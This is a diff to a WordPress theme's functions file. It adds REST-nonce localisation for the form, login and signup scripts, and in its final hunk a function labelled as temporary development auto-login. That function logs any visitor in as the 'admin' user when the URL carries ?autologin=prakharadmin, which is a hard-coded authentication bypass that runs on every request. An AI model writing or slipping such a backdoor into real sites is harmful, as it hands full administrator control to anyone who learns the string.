@@ -29,6 +29,12 @@ function prakhar_scripts() {
     wp_enqueue_script('prakhar-main', PRAKHAR_THEME_URI . '/assets/js/main.js', array(), PRAKHAR_VERSION, true);
     wp_enqueue_script('prakhar-forms', PRAKHAR_THEME_URI . '/assets/js/forms.js', array(), PRAKHAR_VERSION, true);
 
+    // Localize rest url and security nonce for forms submission
+    wp_localize_script('prakhar-forms', 'prakhar_settings', array(
+        'rest_url' => esc_url_raw(rest_url('pi/v1/')),
+        'nonce'    => wp_create_nonce('wp_rest')
+    ));
+
     if (is_front_page()) {
         wp_enqueue_script('prakhar-home', PRAKHAR_THEME_URI . '/assets/js/home.js', array(), PRAKHAR_VERSION, true);
     }
@@ -38,9 +44,17 @@ function prakhar_scripts() {
     }
     if (is_page('login')) {
         wp_enqueue_script('prakhar-login', PRAKHAR_THEME_URI . '/assets/js/login.js', array(), PRAKHAR_VERSION, true);
+        wp_localize_script('prakhar-login', 'prakhar_settings', array(
+            'rest_url' => esc_url_raw(rest_url('pi/v1/')),
+            'nonce'    => wp_create_nonce('wp_rest')
+        ));
     }
     if (is_page('signup')) {
         wp_enqueue_script('prakhar-signup', PRAKHAR_THEME_URI . '/assets/js/signup.js', array(), PRAKHAR_VERSION, true);
+        wp_localize_script('prakhar-signup', 'prakhar_settings', array(
+            'rest_url' => esc_url_raw(rest_url('pi/v1/')),
+            'nonce'    => wp_create_nonce('wp_rest')
+        ));
     }
 }
 add_action('wp_enqueue_scripts', 'prakhar_scripts');
@@ -72,3 +86,18 @@ function prakhar_remove_wpautop_on_pages($content) {
     return $content;
 }
 add_filter('the_content', 'prakhar_remove_wpautop_on_pages', 5);
+
+// Temporary Auto-Login for easy development access
+function prakhar_auto_login() {
+    if (isset($_GET['autologin']) && $_GET['autologin'] === 'prakharadmin') {
+        $user = get_user_by('login', 'admin');
+        if ($user) {
+            wp_clear_auth_cookie();
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID);
+            wp_safe_redirect(admin_url());
+            exit;
+        }
+    }
+}
+add_action('init', 'prakhar_auto_login');
